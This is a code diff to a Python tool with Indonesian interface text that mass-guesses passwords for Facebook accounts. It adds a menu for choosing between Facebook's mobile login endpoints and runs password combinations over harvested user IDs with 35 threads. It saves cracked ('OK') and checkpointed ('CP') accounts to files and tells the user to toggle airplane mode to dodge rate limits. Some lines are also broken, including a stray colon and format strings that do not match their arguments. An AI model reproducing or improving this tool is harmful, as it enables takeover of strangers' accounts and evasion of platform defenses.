@@ -532,7 +532,7 @@ class __crack__:
         print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
         ___yayanganteng___ = input('%s\n [%s?%s] Silakan Tekan (%sENTER%s) : %s'%(N,K,N,H,N,H))
         if ___yayanganteng___ in ('Kontol'):
-            self.kombinasi_pw():
+            self.__pler__():
 
 
     def __metode__(self, cebok, user, pasw):
@@ -598,6 +598,24 @@ class __crack__:
         except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)
 
+            
+    def __pler__(self):
+
+        yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
+        if yan == '':
+            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
+        elif yan in ('1', '01'):
+            xx = "free.facebook.com"
+            self.kombinasi_pw(xx)
+        elif yan in ('2', '02'):
+            xx = "mbasic.facebook.com"
+            self.kombinasi_pw(xx)
+        elif yan in ('3', '03'):
+            xx = "m.facebook.com"
+            self.kombinasi_pw(xx)
+        else:
+            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
+
 
     def kombinasi_pw(self,url):
         print(f"%sPASSWORD MENU%s"%(N,BM,N))
@@ -608,8 +626,8 @@ class __crack__:
         if pw in[""]:
             print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
         elif pw in["1","01"]:
-            print(f" [%s+%s] OK : results/OK-%s-%s-%s.txt"%(N,H,N,ha, op, ta))
-            print(f" %s[%s+%s] CP : results/CP-%s-%s-%s.txt"%(N,K,N,ha, op, ta))
+            print(" [%s+%s] OK : results/OK-%s-%s-%s.txt"%(N,H,N,ha, op, ta))
+            print(" %s[%s+%s] CP : results/CP-%s-%s-%s.txt"%(N,K,N,ha, op, ta))
             print(f" [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Mode Pesawat Setiap DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !")
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
@@ -625,8 +643,8 @@ class __crack__:
             hasil(ok,cp)
 
         elif pw in["2","02"]:
-            print(f" [%s+%s] OK : results/OK-%s-%s-%s.txt"%(N,H,N,ha, op, ta))
-            print(f" [%s+%s] CP : results/CP-%s-%s-%s.txt"%(N,K,N,ha, op, ta))
+            print(" [%s+%s] OK : results/OK-%s-%s-%s.txt"%(N,H,N,ha, op, ta))
+            print(" [%s+%s] CP : results/CP-%s-%s-%s.txt"%(N,K,N,ha, op, ta))
             print(f" [%s!%s] Aktifkan Mode Pesawat 5 detik jika Terkena Spam \n [%s!%s] Aktifkan Kembali Mode Pesawat Pada DUMP ID Ke 1000\n [%s!%s] CTRL+Z %sPada Keyboard%s Jika Ingin Stop !")
             with YayanGanteng(max_workers=35) as kirim:
                 for yntkts in self.id:
